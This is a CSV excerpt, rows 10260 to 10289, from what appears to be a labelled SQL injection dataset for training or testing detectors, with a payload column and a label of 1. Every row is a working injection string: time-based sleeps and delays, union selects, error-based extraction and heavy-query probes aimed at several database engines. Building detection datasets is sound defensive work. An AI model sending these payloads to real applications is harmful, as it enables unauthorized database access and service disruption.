row_index,payload_norm,label,sqli_type_hint
10260,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'bdsq' like 'bdsq",1,
10261,"-8200' in boolean mode ) union all select 3360,3360--",1,
10262,1%' ) or sleep ( 5 ) #,1,
10263,"1'+ ( select 'lawc' where 1171 = 1171 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
10264,1'|| ( select 'ypqa' where 1961 = 1961 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) ||',1,
10265,"-3767' ) as eefl where 8260 = 8260 union all select 8260,8260,8260,8260,8260,8260,8260#",1,
10266,-1127 or 7391 = 4954,1,
10267,"1"" ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",1,
10268,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( '%' = '",1,
10269,"1 ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
10270,-2154%' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and '%' = ',1,
10271,"-4317"" ) ) as nxvn where 2566 = 2566 union all select 2566,2566,2566#",1,
10272,-9434' ) union all select 3106#,1,
10273,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 8535 = 8535",1,
10274,"1%' ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,
10275,select ( case when ( 8601 = 1220 ) then 8601 else 8601* ( select 8601 from mysql.db ) end ) #,1,
10276,"1%' ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( '%' = '",1,
10277,"1"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""umne"" like ""umne",1,
10278,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,
10279,"1%"" union all select null,null,null,null,null,null,null,null#",1,
10280,1 where 3027 = 3027 and 4595 = 4595#,1,
10281,"1 ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 3326 = 3326",1,
10282,"1"" ) and elt ( 4249 = 4249,7259 ) and ( ""xgka"" like ""xgka",1,
10283,"1"" ) where 7588 = 7588 waitfor delay '0:0:5'--",1,
10284,1 ) as obzn where 7652 = 7652 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,1,
10285,"-4127%' union all select 9558,9558,9558#",1,
10286,"1"" ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
10287,-4208%' ) ) ) or 1133 = 9010--,1,
10288,"1' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'yqzg' = 'yqzg",1,
10289,1'+ ( select vfmy where 5711 = 5711,1,
